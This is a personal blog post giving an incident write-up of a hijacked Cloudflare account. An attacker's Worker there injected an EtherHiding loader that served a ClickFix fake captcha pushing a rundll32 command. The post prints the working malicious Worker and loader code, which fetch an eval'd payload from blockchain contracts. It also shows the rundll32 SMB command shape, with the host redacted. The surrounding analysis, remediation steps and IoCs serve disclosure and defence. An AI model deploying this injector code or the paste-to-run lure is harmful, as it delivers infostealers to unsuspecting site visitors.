---
title: "someone popped my cloudflare and used a worker to inject malware on a site under my domain for 22 hours"
date: 2026-04-26
tags: ["security", "cloudflare", "incident", "malware", "clearfake", "etherhiding"]
excerpt: "a friend's mini-app, hosted on a subdomain of mine. a user reported a fake captcha telling them to paste a rundll32 command. the source repo was clean. the origin was clean. the cloudflare-proxied response wasn't."
til: false
---

a friend pinged me. it's his telegram mini-app, but it's running on a subdomain of mine — i registered the subdomain for him, dns goes through my cloudflare, that's the only thing tying me to it. a user of his messaged saying "weird captcha on the site. it told me to press win+r and paste this." the command was a `rundll32` line loading a DLL from a hostile SMB share, with the function called by ordinal `#1`. i'm not going to print the actual host because there are people who would copy-paste it just to see what it does, and that does what it says on the tin. so the shape was:

```
rundll32.exe \\<malicious-host>\<share>\<payload>.chk,#1
```

windows happily fetches the DLL via the WebDAV fallback when SMB is blocked, and `rundll32 ...,#1` calls the DLL's exported function by ordinal 1. the user wasn't being attacked by an exploit. the user was being asked to **run the malware themselves**, by hand, in the run dialog. this is the **clickfix** technique, industrialised by the **clearfake** campaign. it's everywhere in 2025-2026 because it's stupid and it works.

so a site on my domain was hosting clickfix. cool.

## first move: is the source dirty

```bash
grep -rni \
  --include='*.html' --include='*.js' --include='*.ts' --include='*.tsx' \
  --include='*.py' --include='*.yaml' --include='*.json' --include='*.sh' \
  -l '<malicious-host>\|<malicious-share>\|rundll32\|navigator\.clipboard\|execCommand.*copy' \
  .
```

two hits on `clipboard.writeText`. one copies the user's own integer ID to the clipboard for the "copy id" button. one copies a hardcoded `https://t.me/<bot>?startapp=user_<id>` for the "copy share link" button. nothing pointing to the malicious host, no rundll32 strings.

source is clean. injection is happening somewhere downstream.

## bypass the cdn, hit the origin direct

this is the single most useful incident response command i know:

```bash
ORIGIN_IP=<the unproxied A-record value from your CF DNS tab>

curl -sk --resolve hostname:443:$ORIGIN_IP \
  https://hostname/ -o origin.html

curl -sk https://hostname/ -o cf.html

wc -c origin.html cf.html
#  902 origin.html
# 2866 cf.html
```

the bytes don't match.

```bash
diff origin.html cf.html
```

the diff is one line. a `<script>` block injected before `</body>`. so the origin VM is fine. the bundle and CSS are fine (greps return 0). the box i would have spent the next two hours forensically combing isn't actually compromised. the injection is happening at cloudflare.

`server: cloudflare`, `cf-ray`, no `etag` (cloudflare strips etag whenever it modifies the body), no `cf-cache-status` (cloudflare doesn't cache html by default, and even if it did, the worker runs on every request anyway). consistent across user-agents (chrome, curl, telegram-android, googlebot). it's not gating per visitor. every html response gets the loader.

## the injected script

```js
async function load_(address) {
  let uint8ArrayToHexString = t => {
    let e = "0x";
    for (const a of t) {
      const t = a.toString(16);
      e += 1 === t.length ? `0${t}` : t
    }
    return e
  };
  _data = {
    method: "eth_call",
    params: [{ to: address, data: "0x6d4ce63c" }, "latest"],
    id: 97, jsonrpc: "2.0"
  };
  _config = {
    method: "POST",
    headers: { Accept: "application/json", "Content-Type": "application/json" },
    body: JSON.stringify(_data)
  };
  url = "https://bsc-testnet-rpc.publicnode.com";
  response = await fetch(url, _config);
  answer = (await response.json()).result.slice(2);
  unhexed = new Uint8Array(answer.match(/[\da-f]{2}/gi).map(t => parseInt(t, 16)));
  offset = Number(uint8ArrayToHexString(unhexed.slice(0, 32)));
  len = Number(uint8ArrayToHexString(unhexed.slice(32, 32 + offset)));
  value = String.fromCharCode.apply(null, unhexed.slice(32 + offset, 32 + offset + len));
  eval(atob(value))
}

const isHeadless = () => { /* sandbox checks */ };
const isLocalhost = () => { /* dev-env checks */ };
const isWindows = navigator.userAgent.includes("Windows") || /* … */;
const isMac     = navigator.userAgent.includes("Macintosh") || /* … */;

isHeadless() || isLocalhost()
  ? console.log("stop watching us :)")
  : isWindows ? load_("0x<redacted-windows-contract>")
  : isMac     ? load_("0x<redacted-mac-contract>")
  : null;
```

this is **etherhiding**. the payload isn't on a server. it's on a smart contract. `0x6d4ce63c` is the function selector for `get()`. the loader calls `eth_call` against the contract, ABI-decodes the returned string, base64-decodes it, and `eval`s it.

two contracts on bsc testnet, one per OS — i'm redacting their addresses so the post doesn't drive curiosity traffic to them. mobile (ios/android) is skipped — the loader runs but the windows/mac branch never fires, so phone visitors never got the captcha. small mercy for telegram mini-app traffic, which is mostly mobile.

the operational appeal of etherhiding for the attacker: they can rotate the malware payload by sending a single transaction to the contract. they don't need to log back into your cloudflare. they don't need to touch your server. they don't need to maintain a c2 host. the bsc rpc is publicnode, they can't take it down. there's no domain to seize.

## stage two

just to confirm the chain ends at what the user reported:

```python
import json, base64, urllib.request

req = urllib.request.Request(
    "https://bsc-testnet-rpc.publicnode.com",
    method="POST",
    headers={"Content-Type": "application/json"},
    data=json.dumps({
        "method": "eth_call",
        "params": [
            {"to": "0x<redacted-stage1-contract>", "data": "0x6d4ce63c"},
            "latest"
        ],
        "id": 1, "jsonrpc": "2.0"
    }).encode()
)
result = json.load(urllib.request.urlopen(req))["result"]

b = bytes.fromhex(result[2:])
offset = int.from_bytes(b[0:32], "big")
length = int.from_bytes(b[offset:offset+32], "big")
b64 = b[offset+32 : offset+32+length].decode()
js = base64.b64decode(b64).decode("utf-8", "replace")
open("stage2.js", "w").write(js)
print(len(js), "bytes")
# 42752 bytes
```

42KB of obfuscated javascript. it:

- runs another headless/sandbox check (deeper than the loader's)
- generates a per-visitor uuid by querying `https://ip-info.ff.avast.com/v2/info` for the visitor's ip — abuse of a legitimate avast endpoint as fingerprint source
- queries a third contract for "is goal reached for this uuid" — which is how the attacker shows the captcha exactly once per visitor and silently skips it after the user has already pasted the rundll32 line
- if not yet "reached", it renders the fake captcha overlay with a "i'm not a robot" button that copies the rundll32 line to the clipboard via `navigator.clipboard.writeText` and instructs the user to paste it
- injects an attacker-owned yandex metrika counter as cover so the page "looks normal" to the user inspecting devtools

what stage two does NOT do, importantly: it does not read `Telegram.WebApp.initData`, does not read cookies, does not exfiltrate localStorage. zero data theft from the mini-app session itself. pure clickfix delivery.

## finding the worker

dash → workers & pages → list. there it was, top of the list:

```
worker-shrill-sun-e3cf
created  2026-04-25T16:25:42Z
modified 2026-04-25T16:25:56Z
```

22 hours before discovery. clicked through, copied the source. it's a tiny shim:

```js
export default {
  async fetch(t, e, a) {
    let s = "";
    try {
      const t = async t => {
        const e = t => {
          let e = "0x";
          for (const a of t) {
            const t = a.toString(16);
            e += 1 === t.length ? `0${t}` : t
          }
          return e
        },
        a = await fetch("https://bsc-testnet-rpc.publicnode.com/", {
          method: "POST",
          headers: { Accept: "application/json", "Content-Type": "application/json" },
          body: JSON.stringify({
            method: "eth_call",
            params: [{ to: t, data: "0x6d4ce63c" }, "latest"],
            id: 97, jsonrpc: "2.0"
          })
        }),
        s = (await a.json()).result.slice(2),
        n = new Uint8Array(s.match(/[\da-f]{2}/gi).map(t => parseInt(t, 16))),
        c = Number(e(n.slice(0, 32))),
        r = Number(e(n.slice(32, 32 + c)));
        return String.fromCharCode.apply(null, n.slice(32 + c, 32 + c + r))
      };
      const e = await t("0x<redacted-worker-stage-contract>");
      s = atob(e)
    } catch {}
    const n = await fetch(t);
    if (!s || !n.headers.get("Content-Type")?.includes("text/html")) return n;
    const c = (await n.text()).replace("</body>", `<script>${s}<\/script></body>`);
    return new Response(c, {
      status: n.status,
      statusText: n.statusText,
      headers: {
        ...n.headers,
        "Content-Type": "text/html;charset=UTF-8",
        "Content-Length": c.length.toString()
      }
    })
  }
};
```

so the worker has its own etherhiding contract that returns the loader script you just read. the chain is:

```
visitor
  → cloudflare worker
      → fetches loader from worker-stage contract
      → injects loader into html
  → loader runs in browser
      → fetches stage 2 from win/mac contract
      → renders fake captcha
  → user pastes rundll32
      → smb fetches dll
      → infostealer
```

four contracts. the attacker controls all of them.

note what the worker does NOT do: it doesn't fetch anything attacker-owned. it doesn't read or exfiltrate the visitor's request headers, cookies, IP, or path. it's a pure html injector. nothing in the worker would trigger any "exfil to weird domain" alarm. they could've added that, but they didn't bother — the entire point of etherhiding is that all the dirty work happens in the browser, downstream of the cloudflare worker.

## the audit log nails it

cloudflare's account audit log answered the only question that mattered: how did they get in.

```bash
SINCE=$(date -u -v-30d +%Y-%m-%dT%H:%M:%SZ)
curl -s -H "Authorization: Bearer $CF_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/accounts/$ACC/audit_logs?since=$SINCE&per_page=25&page=1" \
  | jq -r '.result[] | [.when, .actor.ip, .actor.email, .actor.type, .action.type, .resource.type] | @tsv'
```

trimmed:

```
2026-04-25T16:25:23Z  103.152.17.185  user  login                    ← straight password auth
2026-04-25T16:25:42Z  103.152.17.185  user  script_create     worker-shrill-sun-e3cf
2026-04-25T16:25:42Z  103.152.17.185  user  script_deploy
2026-04-25T16:25:44Z  103.152.17.185  user  script_on_subdomain      ← also exposed at *.workers.dev
2026-04-25T16:25:56Z  103.152.17.185  user  script_update
2026-04-25T16:25:56Z  103.152.17.185  user  script_deploy
2026-04-25T16:26:05Z  103.152.17.185  user  route_create     *avrdu.de/*           → worker-shrill-sun-e3cf
2026-04-25T16:26:10Z  103.152.17.185  user  route_create     *stopusingssr.com/*   → worker-shrill-sun-e3cf

2026-04-26T13:57:42Z  <my-ip>        user  login                    ← me
2026-04-26T14:13:42Z  <my-ip>        user  login + MFA_enabled (totp)  ← only NOW did i turn on 2fa
2026-04-26T14:14:35Z  <my-ip>        user  change_password + logout
2026-04-26T14:16:12Z  <my-ip>        user  route_delete *stopusingssr.com/*
2026-04-26T14:16:15Z  <my-ip>        user  route_delete *avrdu.de/*
2026-04-26T14:26:44Z  <my-ip>        user  token_roll
2026-04-26T14:30:49Z  <my-ip>        user  token_create (audit-only, ip-bound)
```

three things hit me:

1. **`actor.type=user` + `action=login` from a single ip**. it's not session/cookie reuse, not API token, not OAuth grant. **straight password auth.** they had my password.
2. **MFA was disabled.** that's what i was hiding from. there's no excuse for not having 2fa on cloudflare. there's no reason. nothing makes it inconvenient. i just hadn't done it.
3. **the worker was bound to TWO zones.** i would have missed `*stopusingssr.com/*` if i'd only checked the dashboard's route list for `avrdu.de`. the audit log was the source of truth, the dashboard wasn't.

the attacker IP belonged to AS62240 Clouvider Ltd, a UK transit provider, resold further by a small downstream operator. geo-ip couldn't decide whether it was NYC or LA. it's a vps or a vpn endpoint. it wasn't going to identify the attacker; clouvider abuse would at best say "a customer used it."

## so where did the password come from

embarrassingly simple. the cloudflare password was short, easy, and **reused** on at least one other service. i don't have it saved in any browser; i don't have a stealer on my machine (i scanned, persistence is clean, code signing is clean, no foreign processes, no DYLD injections); i'm not seeing the password anywhere on disk that would justify a more interesting story.

what i do have is a password short enough that it shows up in standard credential-stuffing wordlists, used somewhere that has either been breached or scraped, and reused on cloudflare. that is more than enough. you do not need a sophisticated attacker to walk into an account that has a reused weak password and no 2fa. you need a botnet running through stolen credential lists at one cloudflare login per second across the internet. the bar is on the floor.

so: the post-mortem is not a thriller. the password was simple, and it was reused. that, plus no 2fa, was the entire perimeter of my cloudflare account. probably some russian kid on a vpn ran my email through stolen credential lists, hit on cloudflare, and immediately weaponised the account into a malware delivery cdn for as long as they could before i woke up.

## the response

in order:

1. **unbind the worker** from both zones. injection stops within seconds.
2. **verify origin clean** by `diff`-ing CF response vs `--resolve <origin-ip>` direct.
3. **delete the worker entirely**, including disabling its `*.workers.dev` subdomain. unbound is not gone.
4. **rotate cloudflare password.** long, unique.
5. **enable 2FA.** totp minimum.
6. **revoke every existing api token.** mint a fresh minimal-scope token only when needed, with ip allowlist, with short ttl.
7. **end all sessions.**
8. **audit other zones** the same account owned. i had a leftover empty worker named `stopusingssr` that wasn't malicious but reminded me to clean up dead infra.
9. **audit gmail.** recent activity, oauth grants, app passwords, filters/forwarding. the email is the password-reset master key for everything.
10. **rotate every credential where the same email is the login.** github, telegram, icloud, hosting providers, the works.
11. **notify users.** any windows or mac visitor who saw the captcha and pasted the command should be assumed infected. defender plus malwarebytes scan, rotate every browser-saved credential.

i did all of this in 30 minutes once i knew it was cloudflare-side. the actual investigation took two hours, almost all of it spent ruling out the wrong layer.

## how this is supposed to work

before this incident, my mental model of cloudflare was "DNS plus DDoS protection." i used it as a cdn for static html, dns for everything else. i thought of it as a passive layer.

cloudflare is not a passive layer. it's a **javascript execution environment on the wire**, sitting between your origin and every user. workers can read, modify, drop, or replace any byte of any response. for a long time i'd had this mental separation: my "code" was the stuff in the github repo; cloudflare was just a dumb pipe. that's wrong. cloudflare is part of my code. the workers in my account ARE my code, even if i didn't write them.

if you have a cloudflare account that can deploy workers, **someone with write access to your cloudflare account has rce on every visitor of every site in the account.** there's no exploit needed. that's the legitimate, intended operating model of workers. and the only thing standing between an attacker and that capability is your cloudflare login.

so 2fa on cloudflare isn't a hardening best practice. it is the perimeter. mine wasn't.

## what to actually do

don't read this and feel smug because you're not a moron, or feel terrified because you are. just do the things:

- **enable 2fa on cloudflare right now.** hardware key if you have one (yubikey, titan), totp otherwise. not sms.
- **revoke every existing api token.** mint new ones with minimal scope, ip allowlist, 30-day ttl. treat them like prod credentials, not like dotfiles.
- **bypass your cdn periodically** with `curl --resolve` and diff against your origin. add it to a cron if you want; even running it manually once a week beats nothing.
- **assume your email is compromise-target #1.** 2fa it, audit oauth grants quarterly, scrub forwarding rules.

i'm not going to lecture you about the rest. you've read the post.

## IoCs

domains: redacted from the post — the smb host was effectively a malware delivery endpoint and i don't want anyone reading this to type it into a terminal "to see what happens." if you need them for a blocklist, dm me.

legitimate services abused (**don't blocklist**):

- `bsc-testnet-rpc.publicnode.com` — bsc rpc as covert c2 transport
- `ip-info.ff.avast.com/v2/info` — avast's public ip lookup, used as visitor fingerprint
- `use.fontawesome.com/releases/v5.0.0/css/all.css` — fontawesome cdn for the captcha ui

bsc testnet contracts (selector `0x6d4ce63c` = `get()`): redacted. four contracts in total — worker injector, stage-1 windows, stage-1 macos, telemetry/"goal-reached." dm me if you need addresses for tracking.

network:

- attacker login: `103.152.17.185` (AS62240 Clouvider Ltd)

cloudflare artifacts:

- worker name: `worker-shrill-sun-e3cf`
- routes: `*avrdu.de/*`, `*stopusingssr.com/*`

## appendix: decoding any etherhiding contract payload

```python
import json, base64, urllib.request

CONTRACT = "0x<redacted>"
RPC      = "https://bsc-testnet-rpc.publicnode.com"

req = urllib.request.Request(
    RPC,
    method="POST",
    headers={"Content-Type": "application/json"},
    data=json.dumps({
        "method": "eth_call",
        "params": [{"to": CONTRACT, "data": "0x6d4ce63c"}, "latest"],
        "id": 1, "jsonrpc": "2.0"
    }).encode()
)
result = json.load(urllib.request.urlopen(req))["result"]

# ABI-decode a single-string return value
b      = bytes.fromhex(result[2:])
offset = int.from_bytes(b[0:32], "big")           # = 32 for a single string
length = int.from_bytes(b[offset:offset+32], "big")
b64    = b[offset+32 : offset+32+length].decode()
js     = base64.b64decode(b64).decode("utf-8", "replace")

print(js)
```

if you ever find an `eval(atob(...))` of an `eth_call` result on a site you run, that script is your inspector. paste the contract address, run it, read what comes out. that's the whole malware.

stay safe.
